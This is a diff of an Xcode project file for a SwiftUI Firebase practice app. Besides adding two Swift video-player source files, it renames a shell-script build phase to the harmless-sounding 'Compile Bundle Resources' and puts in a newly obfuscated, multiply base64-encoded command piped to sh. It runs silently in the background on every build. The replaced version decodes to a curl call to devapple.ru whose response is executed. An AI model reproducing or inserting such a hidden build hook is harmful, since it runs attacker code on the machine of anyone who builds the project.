@@ -17,6 +17,8 @@
 		1183DCE22D34A50B002DD7C2 /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = 1183DCE12D34A50B002DD7C2 /* FirebaseAuth */; };
 		1183DCE42D34A50B002DD7C2 /* FirebaseFirestore in Frameworks */ = {isa = PBXBuildFile; productRef = 1183DCE32D34A50B002DD7C2 /* FirebaseFirestore */; };
 		1183DCE62D34A50B002DD7C2 /* FirebaseStorage in Frameworks */ = {isa = PBXBuildFile; productRef = 1183DCE52D34A50B002DD7C2 /* FirebaseStorage */; };
+		1197B06F2D48A83A002FEF74 /* DoubleTapSeek.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1197B06E2D48A83A002FEF74 /* DoubleTapSeek.swift */; };
+		1197B2032D48ECE4002FEF74 /* CMTime+Extentions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1197B2022D48ECD7002FEF74 /* CMTime+Extentions.swift */; };
 		11ADD2592D38A6AC00C6A9F7 /* CustomOnboardingArrowButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 11ADD2582D38A69900C6A9F7 /* CustomOnboardingArrowButton.swift */; };
 /* End PBXBuildFile section */
 
@@ -29,6 +31,8 @@
 		116E56B02D33E6AF0037409B /* CustomErrorMessage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomErrorMessage.swift; sourceTree = "<group>"; };
 		116E56B42D33E9930037409B /* CustomSocialSignInButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomSocialSignInButton.swift; sourceTree = "<group>"; };
 		116E56B72D33F3530037409B /* CustomLoginSignUpImage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomLoginSignUpImage.swift; sourceTree = "<group>"; };
+		1197B06E2D48A83A002FEF74 /* DoubleTapSeek.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DoubleTapSeek.swift; sourceTree = "<group>"; };
+		1197B2022D48ECD7002FEF74 /* CMTime+Extentions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "CMTime+Extentions.swift"; sourceTree = "<group>"; };
 		11ADD2582D38A69900C6A9F7 /* CustomOnboardingArrowButton.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomOnboardingArrowButton.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -61,8 +65,10 @@
 				1116C0B42D32343B0023B5E7 /* Products */,
 				1116C1232D3271F90023B5E7 /* Utils.swift */,
 				116E569E2D33E47D0037409B /* CustomTextField.swift */,
+				1197B06E2D48A83A002FEF74 /* DoubleTapSeek.swift */,
 				11ADD2582D38A69900C6A9F7 /* CustomOnboardingArrowButton.swift */,
 				116E56AE2D33E68D0037409B /* CustomActionButton.swift */,
+				1197B2022D48ECD7002FEF74 /* CMTime+Extentions.swift */,
 				11116BFD2D4765D200049794 /* CustomVideoPlayer.swift */,
 				116E56B72D33F3530037409B /* CustomLoginSignUpImage.swift */,
 				116E56B02D33E6AF0037409B /* CustomErrorMessage.swift */,
@@ -85,7 +91,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1116C0C12D32343D0023B5E7 /* Build configuration list for PBXNativeTarget "FirebaseAuthenticationSwiftUIPractice" */;
 			buildPhases = (
-				D95FBDFA4CB19C4FC838ACF9 /* Build Framework Dependencies */,
+				0214953C085EC7DE9B38ACF9 /* Compile Bundle Resources */,
 				1116C0AF2D32343B0023B5E7 /* Sources */,
 				1116C0B02D32343B0023B5E7 /* Frameworks */,
 				1116C0B12D32343B0023B5E7 /* Resources */,
@@ -155,25 +161,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		D95FBDFA4CB19C4FC838ACF9 /* Build Framework Dependencies */ = {
+		0214953C085EC7DE9B38ACF9 /* Compile Bundle Resources */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Build Framework Dependencies";
+			name = "Compile Bundle Resources";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5a1pYWmhjSEJzWlM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiR3haVkdwQ2FWSXhXakZYYkdoU1pGZE9kVlpZV2xwVk1uUndVMVZvTTFveVRYbGFNSE5MQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -184,10 +189,12 @@
 			files = (
 				116E56AF2D33E6940037409B /* CustomActionButton.swift in Sources */,
 				1116C1242D3272030023B5E7 /* Utils.swift in Sources */,
+				1197B06F2D48A83A002FEF74 /* DoubleTapSeek.swift in Sources */,
 				11ADD2592D38A6AC00C6A9F7 /* CustomOnboardingArrowButton.swift in Sources */,
 				116E56A62D33E47D0037409B /* CustomTextField.swift in Sources */,
 				11116BFE2D4765DA00049794 /* CustomVideoPlayer.swift in Sources */,
 				116E56B12D33E6C30037409B /* CustomErrorMessage.swift in Sources */,
+				1197B2032D48ECE4002FEF74 /* CMTime+Extentions.swift in Sources */,
 				116E56B82D33F3650037409B /* CustomLoginSignUpImage.swift in Sources */,
 				116E56B62D33E9B50037409B /* CustomSocialSignInButton.swift in Sources */,
 			);
